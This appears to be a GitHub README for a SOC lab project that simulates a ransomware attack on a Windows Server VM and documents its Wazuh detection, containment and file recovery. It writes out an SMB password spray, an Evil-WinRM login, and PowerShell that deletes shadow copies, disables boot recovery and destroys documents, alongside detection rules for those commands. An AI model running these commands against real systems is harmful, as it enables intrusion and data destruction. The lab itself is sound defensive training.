# ðŸ›¡ï¸ Enterprise Incident Detection & Response: Ransomware on Windows Server 2022

[![Platform](https://img.shields.io/badge/Platform-Windows%20Server%202022-0078D6?logo=windows&logoColor=white)](#)
[![SIEM](https://img.shields.io/badge/SIEM-Wazuh%20v4.9.2-005B94?logo=wazuh&logoColor=white)](#)
[![Attacker](https://img.shields.io/badge/Adversary-Kali%20Linux%202026-557C94?logo=kalilinux&logoColor=white)](#)
[![Telemetry](https://img.shields.io/badge/Telemetry-Sysmon%20v15-107C41?logo=microsoft&logoColor=white)](#)
[![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red)](#)
[![Status](https://img.shields.io/badge/Status-Completed-success)](#)

> **Lead Security Engineer:** Mohammad Hasnain Ali  
> **Target Asset:** Windows Server 2022 Datacenter (`192.168.56.103`)  
> **SIEM & Monitoring:** Wazuh All-in-One (`192.168.56.101`)  
> **Adversary Emulation:** Kali Linux 2026.3 (`192.168.56.102`)  
> **Formal Deliverables:** [PDF Report](reports/Incident%20Analysis%20Report%20Ransomware%20Attack%20in%20Windows%20Server.pdf) | [Word Report (.docx)](reports/Incident_Analysis_Report_Ransomware.docx) | [Markdown Report](reports/Incident_Analysis_Report_Ransomware.md)

---

## ðŸ“Œ Project Overview

This repository documents an end-to-end **Security Operations Center (SOC) Detection and Incident Response** project investigating a simulated multi-stage ransomware attack against an enterprise Windows Server 2022 system. 

The lab replicates a realistic adversary campaign including:
1. **Network Discovery:** Scanning management ports via Nmap.
2. **Credential Access:** SMB password spraying using NetExec (`nxc`).
3. **Lateral Movement / Remote Access:** Gaining an interactive remote shell via **Evil-WinRM** (Port 5985).
4. **Inhibit System Recovery:** Deleting Volume Shadow Copies (`vssadmin`) and tampering with boot configuration (`bcdedit`).
5. **Data Encrypted for Impact:** Encrypting high-value documents in `C:\Finance` with `.locked` extensions and dropping an extortion note.
6. **Detection Engineering:** Authoring custom Wazuh correlation rules raising **Severity Level 14 (CRITICAL)** alerts mapped to **MITRE ATT&CK**.
7. **Incident Containment & Lossless Recovery:** Host isolation, attacker process eviction, and automated reverse-decryption of all files.

---

## ðŸ›ï¸ Lab Architecture & Network Topology

The environment runs on **Oracle VirtualBox 7.x** using an isolated host-only virtual switch (`192.168.56.0/24`):

```text
               +--------------------------------------------------+
               |        Isolated Virtual Switch (192.168.56.0/24)  |
               +--------------------------------------------------+
                        |                         |
       +-------------------------------+   +-------------------------------+
       |       ðŸ”´ Kali Linux           |   |    ðŸŽ¯ Windows Server 2022    |
       |       Attacker Node           |   |       Target / Victim         |
       |       IP: 192.168.56.102      |   |       IP: 192.168.56.103      |
       |       - Nmap Recon            |   |       - Sysmon v15 Telemetry  |
       |       - NetExec (SMB Spray)   |   |       - Real-Time FIM Agent   |
       |       - Evil-WinRM Shell      |   |       - Protected: C:\Finance |
       +-------------------------------+   +-------------------------------+
                                                           |
                                               Logs & Alerts (TCP 1514)
                                                           |
                                                           v
                                           +-------------------------------+
                                           |      ðŸ”µ Ubuntu Server 22.04   |
                                           |      Wazuh SIEM / Indexer     |
                                           |      IP: 192.168.56.101       |
                                           |      - OpenSearch Dashboards  |
                                           |      - Custom Rule 100100     |
                                           |      - Port 443 HTTPS Web UI  |
                                           +-------------------------------+
```

### Virtual Machine Node Summary

| Role | Hostname | Operating System | IP Address | Primary Services & Tools |
| :--- | :--- | :--- | :--- | :--- |
| **SIEM / SOC Center** | `wazuh-server` | Ubuntu Server 22.04 LTS | `192.168.56.101` | Wazuh Manager, Indexer, OpenSearch Dashboard (Port 443) |
| **Target Endpoint** | `WinServer-Target` | Windows Server 2022 Datacenter | `192.168.56.103` | Sysmon v15, Wazuh Agent v4.9.2, WinRM, SMB, `C:\Finance` |
| **Attacking Host** | `kali` | Kali Linux 2026.3 | `192.168.56.102` | Nmap 7.99, NetExec (`nxc`), Evil-WinRM v4.1, Hydra |

---

## âš™ï¸ Telemetry Hardening & Detection Engineering

### 1. Endpoint Instrumentation
* **Sysmon v15:** Installed using [SwiftOnSecurity's schema](configs/sysmonconfig-ransomware.xml) to capture command-line arguments, parent process IDs, and hashes (`Event ID 1`).
* **Advanced Audit Policies:** Configured via `enable_auditing.ps1` for Process Creation (with command-line logging), File System access, and Logon/Logoff events.
* **Wazuh Agent (`ossec.conf`):** Configured with real-time File Integrity Monitoring (FIM) on `C:\Finance` and ingested the `Microsoft-Windows-Sysmon/Operational` event channel. *(See [configs/wazuh_agent_ossec.conf](configs/wazuh_agent_ossec.conf))*.

### 2. Custom SIEM Correlation Rules (`local_rules.xml`)
Custom rules were deployed to `/var/ossec/etc/rules/local_rules.xml` on the Wazuh Manager to escalate ransomware behavioral patterns:

```xml
<group name="windows,sysmon,ransomware,">
  <!-- Rule 100100: Shadow Copy Destruction (T1490) -->
  <rule id="100100" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.commandLine">delete shadows</field>
    <description>CRITICAL: Ransomware Behavior Detected - Volume Shadow Copies Deletion (MITRE T1490)</description>
    <mitre><id>T1490</id></mitre>
  </rule>

  <!-- Rule 100101: BCDedit Boot Recovery Disabling (T1490) -->
  <rule id="100101" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.commandLine">recoveryenabled</field>
    <description>CRITICAL: Ransomware Defense Evasion - Boot Recovery Disabled via BCDedit (MITRE T1490)</description>
    <mitre><id>T1490</id></mitre>
  </rule>
</group>
```

---

## ðŸ“Š Comprehensive Inventory of Rules Triggered

| Rule ID | Severity Level | Rule Group | Description & Signature Match | MITRE ATT&CK |
| :---: | :---: | :---: | :--- | :--- |
| **`100100`** | **14 (Critical)** | `sysmon, ransomware` | **CRITICAL: Ransomware Behavior Detected - Volume Shadow Copies Deletion** (`vssadmin delete shadows /all /quiet`) | **T1490** (Inhibit System Recovery) |
| **`100101`** | **12 (High)** | `sysmon, defense_evasion` | **CRITICAL: Ransomware Defense Evasion - Boot Recovery Disabled** (`bcdedit recoveryenabled No`) | **T1490** (Inhibit System Recovery) |
| **`61618`** | **12 (High)** | `sysmon, process` | **Sysmon: Suspicious Process Creation - svchost.exe / service host tampering** | **T1059** (Scripting) |
| **`60122`** | **5 (Warning)** | `windows, logon_failure` | **Logon failure - Unknown user or bad password** (Windows Security Event ID 4625 via SMB Spray) | **T1110** (Brute Force) |
| **`60106`** | **3 (Info)** | `windows, logon_success` | **Windows Logon Success** (Windows Security Event ID 4624 - Network Logon Type 3 via WinRM) | **T1078** (Valid Accounts) |
| **`61138`** | **5 (Warning)** | `windows, service` | **New Windows Service Created** (Windows System Event ID 7045) | **T1543.003** (Windows Service) |
| **`61104`** | **3 (Info)** | `windows, service` | **Service startup type was changed** (Windows System Event ID 7040) | **T1562.001** (Disable Tools) |
| **`550`** | **7 (Medium)** | `syscheck, fim` | **Integrity checksum changed** (Modifications to document files and ransom note content) | **T1486** (Encrypted for Impact) |
| **`553`** | **7 (Medium)** | `syscheck, fim` | **File deleted** (Adversary deleting original `Quarterly_Report_*.docx` records) | **T1485** (Data Destruction) |
| **`554`** | **5 (Warning)** | `syscheck, fim` | **File added to the system** (Creation of `.docx.locked` files and `README_HOW_TO_RECOVER.txt`) | **T1486** (Encrypted for Impact) |

---

## ðŸš€ Chronological Attack Simulation & Evidence Showcase

### 1. Network Reconnaissance (T1046)
The adversary scans the target Windows Server (`192.168.56.103`) to identify attack vectors:
```bash
nmap -Pn -sV -p 135,139,445,3389,5985 192.168.56.103
```
![Reconnaissance](Screenshots/Reconnaissance.png)

---

### 2. Credential Access & Password Spraying (T1110)
Adversary performs password spraying against SMB (Port 445) from Kali Linux:
```bash
nxc smb 192.168.56.103 -u Administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt
```
![Brute Force Attack](Screenshots/Brute%20Force%20Attack.png)

#### SIEM Detection:
Wazuh logs Event ID 4625 (**Rule 60122**), capturing the caller IP (`192.168.56.102`) and workstation `KALI`:
![Bruteforce Logged](Screenshots/Bruteforce%20Logged.png)

---

### 3. Lateral Movement & Ransomware Execution (T1021.006 & T1490)
Using compromised administrative credentials, the adversary connects via **Evil-WinRM** on Port 5985 and executes the ransomware payload:
```powershell
vssadmin.exe delete shadows /all /quiet
bcdedit.exe /set '{default}' recoveryenabled No
# Mass Encryption of C:\Finance & Ransom Note Drop
Get-ChildItem -Path "C:\Finance" -Filter *.docx | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    [System.IO.File]::WriteAllText($_.FullName + ".locked", [Convert]::ToBase64String($bytes))
    Remove-Item $_.FullName -Force
}
Set-Content -Path "C:\Finance\README_HOW_TO_RECOVER.txt" -Value "DATA LOCKED BY KALI ATTACKER."
```
![Ransomware Attack](Screenshots/Ransomware%20Attack.png)

---

### 4. Real-Time File Integrity Monitoring (FIM) Alerts (T1486)
Wazuh FIM captures **23 real-time events** auditing original files deleted, `.locked` files added, and extortion notes dropped:
![Attack Logged 1](Screenshots/Attack%20Logged%201.png)

---

### 5. Level 14 CRITICAL SIEM Alert Firing (Rule 100100)
Custom correlation engine detects `vssadmin` deleting Volume Shadow Copies, immediately raising a Level 14 alert:
![Attack Logged 2](Screenshots/Attack%20Logged%202.png)

---

### 6. MITRE ATT&CK Matrix & Visual Dashboard Analytics
The entire attack campaign is mapped to MITRE tactics and techniques:
![Attack Logged 3](Screenshots/Attack%20Logged%203.png)
![Attack Logged 4](Screenshots/Attack%20Logged%204.png)

---

### 7. Containment & Attacker Eviction
Incident responders execute [containment_playbooks/isolate_host.ps1](containment_playbooks/isolate_host.ps1) to terminate attacker worker processes (`wsmprovhost.exe`), sever the Evil-WinRM shell, isolate network boundaries, and disable the compromised account:
![Containment](Screenshots/Containment.png)
![Removing Access of Attacker](Screenshots/Removing%20Access%20of%20Attacker.png)

---

### 8. SOC Lossless Data Decryption & Recovery
The incident response team runs [simulation/decrypt_restore_files.ps1](simulation/decrypt_restore_files.ps1), decoding byte streams, restoring original `.docx` extensions, and purging the ransom note:
```powershell
# Automated SOC Decryptor
$targetFolder = "C:\Finance"
Get-ChildItem -Path $targetFolder -Filter *.locked | ForEach-Object {
    $b64 = [System.IO.File]::ReadAllText($_.FullName)
    $orig = [Convert]::FromBase64String($b64)
    $restored = $_.FullName -replace '\.locked$', ''
    [System.IO.File]::WriteAllBytes($restored, $orig)
    Remove-Item $_.FullName -Force
}
Remove-Item "$targetFolder\README_HOW_TO_RECOVER.txt" -Force
```
* **Result:** **100% Lossless Recovery** (10 of 10 documents restored with zero byte corruption):
![Decrypting Files](Screenshots/Decrypting%20Files.png)

---

## ðŸ“ Repository Directory Structure

```text
â”œâ”€â”€ .gitignore                                  # Git exclusion file for VMs, ISOs, and temp files
â”œâ”€â”€ README.md                                   # Comprehensive GitHub Project Portfolio
â”œâ”€â”€ Incident_Analysis_Report_Ransomware.docx    # Full 3.4MB formatted Word Document
â”œâ”€â”€ Incident Analysis Report ... .pdf           # Official PDF Report Deliverable
â”‚
â”œâ”€â”€ configs/
â”‚   â”œâ”€â”€ enable_auditing.ps1                     # Enables Windows Advanced Auditing & Process Logging
â”‚   â”œâ”€â”€ inputs.conf                             # Splunk Forwarder config (Alternative SIEM option)
â”‚   â”œâ”€â”€ sysmonconfig-ransomware.xml             # SwiftOnSecurity Sysmon v15 schema
â”‚   â”œâ”€â”€ verify_phase1_telemetry.ps1             # Validates Sysmon & EventLog generation
â”‚   â””â”€â”€ wazuh_agent_ossec.conf                  # Wazuh Windows Agent XML config (FIM + Sysmon)
â”‚
â”œâ”€â”€ containment_playbooks/
â”‚   â””â”€â”€ isolate_host.ps1                        # Emergency host isolation & session termination
â”‚
â”œâ”€â”€ detection_rules/
â”‚   â”œâ”€â”€ wazuh_custom_rules.xml                  # Custom Wazuh correlation rules (Rules 100100 & 100101)
â”‚   â””â”€â”€ splunk_correlation_rules.spl            # Production Splunk SPL detection queries
â”‚
â”œâ”€â”€ reports/
â”‚   â”œâ”€â”€ Incident_Analysis_Report_Ransomware.md  # Comprehensive Markdown Report
â”‚   â”œâ”€â”€ Incident_Analysis_Report_Ransomware.docx# Formatted DOCX Report with embedded images
â”‚   â”œâ”€â”€ Incident Analysis Report ... .pdf       # Complete PDF Deliverable
â”‚   â””â”€â”€ Incident_Analysis_Report_Template.md    # Standard SOC report template
â”‚
â”œâ”€â”€ Screenshots/                                # 17 Chronological Evidence Screenshots
â”‚   â”œâ”€â”€ Ubuntu Wazuh VM.png
â”‚   â”œâ”€â”€ Windows Victim VM.png
â”‚   â”œâ”€â”€ Kali Attack VM.png
â”‚   â”œâ”€â”€ Wazuh Install.png
â”‚   â”œâ”€â”€ Wazuh Agent Active.png
â”‚   â”œâ”€â”€ Wazuh Dashboard.png
â”‚   â”œâ”€â”€ Reconnaissance.png
â”‚   â”œâ”€â”€ Brute Force Attack.png
â”‚   â”œâ”€â”€ Bruteforce Logged.png
â”‚   â”œâ”€â”€ Ransomware Attack.png
â”‚   â”œâ”€â”€ Attack Logged 1.png
â”‚   â”œâ”€â”€ Attack Logged 2.png
â”‚   â”œâ”€â”€ Attack Logged 3.png
â”‚   â”œâ”€â”€ Attack Logged 4.png
â”‚   â”œâ”€â”€ Containment.png
â”‚   â”œâ”€â”€ Removing Access of Attacker.png
â”‚   â””â”€â”€ Decrypting Files.png
â”‚
â”œâ”€â”€ simulation/
â”‚   â”œâ”€â”€ Simulated_Ransomware.ps1                # Safe ransomware simulation payload
â”‚   â”œâ”€â”€ decrypt_restore_files.ps1               # SOC Decryption & Data Recovery utility
â”‚   â””â”€â”€ cleanup_simulation.ps1                  # Sandbox reset & directory cleaner
â”‚
â””â”€â”€ Wazuh Reports/                              # Exported Wazuh SIEM Executive PDF summaries
    â”œâ”€â”€ wazuh-module-overview-fim-1793513196.pdf
    â”œâ”€â”€ wazuh-module-overview-general-1793513233.pdf
    â””â”€â”€ wazuh-module-overview-mitre-1793513123.pdf
```

---

## ðŸ› ï¸ Step-by-Step Reproduction Guide

1. **Setup Isolated Virtual Network:** In VirtualBox, create a Host-Only adapter (`192.168.56.0/24`). Attach Ubuntu, Windows Server 2022, and Kali Linux to this adapter.
2. **Deploy Wazuh All-in-One:** Install Wazuh SIEM on Ubuntu 22.04 using `bash ./wazuh-install.sh -a`. Add custom rules from `detection_rules/wazuh_custom_rules.xml` to `/var/ossec/etc/rules/local_rules.xml`.
3. **Harden & Enroll Windows Server:** Run `configs/enable_auditing.ps1`, install Sysmon with `configs/sysmonconfig-ransomware.xml`, and configure `C:\Program Files (x86)\ossec-agent\ossec.conf` using `configs/wazuh_agent_ossec.conf`.
4. **Execute Attack from Kali:** Run Nmap reconnaissance, NetExec SMB password spraying, and connect via `evil-winrm -i 192.168.56.103 -u Administrator -p 'Eren@1483'`. Execute `simulation/Simulated_Ransomware.ps1`.
5. **Analyze SIEM Detections:** Observe FIM table, Rule `100100` Level 14 alert, and MITRE ATT&CK matrix in the Wazuh Web UI (`https://192.168.56.101`).
6. **Contain & Recover:** Execute `containment_playbooks/isolate_host.ps1` to isolate the host and terminate attacker sessions. Run `simulation/decrypt_restore_files.ps1` to restore all files to original unencrypted formats.

---

## ðŸ‘¤ Author & Acknowledgments

* **Project Lead:** Mohammad Hasnain Ali
* **Specialization:** Cybersecurity / SOC Operations / Threat Hunting & Incident Response
* **Certifications / Methodologies:** MITRE ATT&CK Framework, NIST SP 800-61r2 Incident Response Lifecycle.

